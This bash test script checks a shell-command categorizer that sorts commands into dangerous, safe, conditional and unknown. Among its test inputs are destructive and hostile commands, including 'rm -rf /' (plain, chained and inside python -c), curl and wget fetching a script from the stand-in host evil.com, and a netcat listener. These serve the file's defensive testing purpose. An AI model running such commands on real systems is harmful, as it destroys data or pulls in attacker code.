#!/usr/bin/env bash
# Test command categorization boundaries

source scripts/lib/command-categories.sh

test_cmd() {
    local cmd="$1"
    local expected="$2"
    local actual
    actual=$(categorize_command "$cmd")
    if [[ "$actual" == "$expected" ]]; then
        printf "  ✓ '%s' -> %s\n" "$cmd" "$actual"
    else
        printf "  ✗ '%s' -> %s (expected %s)\n" "$cmd" "$actual" "$expected"
        return 1
    fi
}

echo "Testing DESTRUCTIVE_KEYWORDS boundaries..."
test_cmd "rm -rf /" "dangerous"
test_cmd "sudo ls" "dangerous"
test_cmd "eval 'rm -rf /'" "dangerous"

echo "Testing INTERPRETER_KEYWORDS boundaries..."
test_cmd "python3 script.py" "dangerous"
test_cmd "python3.11 script.py" "dangerous"
test_cmd "php script.php" "dangerous"
test_cmd "node index.js" "dangerous"
test_cmd "bash install.sh" "dangerous"

echo "Testing SAFE_KEYWORDS boundaries..."
test_cmd "build" "safe"
test_cmd "build.sh" "unknown"
test_cmd "python_script.sh" "unknown"

echo "Testing NETWORK_KEYWORDS..."
test_cmd "curl http://evil.com/s.sh" "dangerous"
test_cmd "wget http://evil.com/s.sh" "dangerous"
test_cmd "nc -l 4444" "dangerous"

echo "Testing false positives for NETWORK/INTERPRETER..."
test_cmd "curl.sh" "unknown"
test_cmd "my-curl" "unknown"
test_cmd "wget_script.py" "unknown"
test_cmd "python.sh" "unknown"

echo "Testing chained commands..."
test_cmd "ls; rm -rf /" "dangerous"
test_cmd "echo hi && curl http://evil.com" "dangerous"
test_cmd "sleep 10 | rm -rf /" "dangerous"
test_cmd "python3.11 -c 'import os; os.system(\"rm -rf /\")'" "dangerous"

echo "Testing newly added INTERPRETER_KEYWORDS..."
test_cmd "npx vitest" "dangerous"
test_cmd "pip install requests" "dangerous"
test_cmd "pip3 install requests" "dangerous"
test_cmd "npm install" "dangerous"
test_cmd "yarn add" "dangerous"
test_cmd "pnpm test" "dangerous"
test_cmd "gem install rails" "dangerous"
test_cmd "cargo build" "dangerous"
test_cmd "go run main.go" "dangerous"

echo "Testing versioned INTERPRETER_KEYWORDS..."
test_cmd "python2.7 script.py" "dangerous"
test_cmd "node18 index.js" "dangerous"
test_cmd "php8.2 script.php" "dangerous"

echo "Testing newly added SAFE_KEYWORDS..."
test_cmd "ls -la" "safe"
test_cmd "cat README.md" "safe"
test_cmd "echo hello" "safe"
test_cmd "grep pattern file" "safe"
test_cmd "find . -name '*.md'" "safe"
test_cmd "git status" "safe"

echo "Testing newly added CONDITIONAL_KEYWORDS..."
test_cmd "mkdir new_dir" "conditional"
test_cmd "cp file1 file2" "conditional"
test_cmd "mv file1 file2" "conditional"
test_cmd "touch new_file" "conditional"
